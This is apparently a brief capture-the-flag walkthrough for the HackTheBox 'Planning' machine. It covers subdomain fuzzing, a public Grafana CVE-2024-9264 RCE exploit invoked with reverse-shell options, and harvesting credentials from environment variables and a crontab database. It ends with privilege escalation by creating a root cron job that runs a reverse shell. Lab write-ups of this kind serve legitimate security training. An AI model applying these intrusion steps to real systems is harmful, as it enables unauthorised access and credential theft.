# Planning - Grafana RCE / Crontab UI

**Find grafana subdomain**

```bash
ffuf -u http://planning.htb/ -H "Host: FUZZ.planning.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fw 6
```

**RCE for grafana**

https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit

```bash
python3 poc.py [--url <target>] [--username <username>] [--password <password>] [--reverse-ip <IP>] [--reverse-port <PORT>]
```

## linpeas.sh tool

GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo

[image]

## Crontab UI

**Find sensitive information from crontab.db file**

```bash
enzo@planning:/opt/crontabs$ cat crontab.db
```

**Password:** `P4ssw0rdS0pRi0T3c`

[image]

## SSH Port forwarding 8000 /Crontab UI/

**Username:** `root`

**Password:** `P4ssw0rdS0pRi0T3c`

[image]

**Create new cronjobs**

[image]

`/tmp/reverse-ip` файлын агуулга

[image]

## Root!!!

[image]
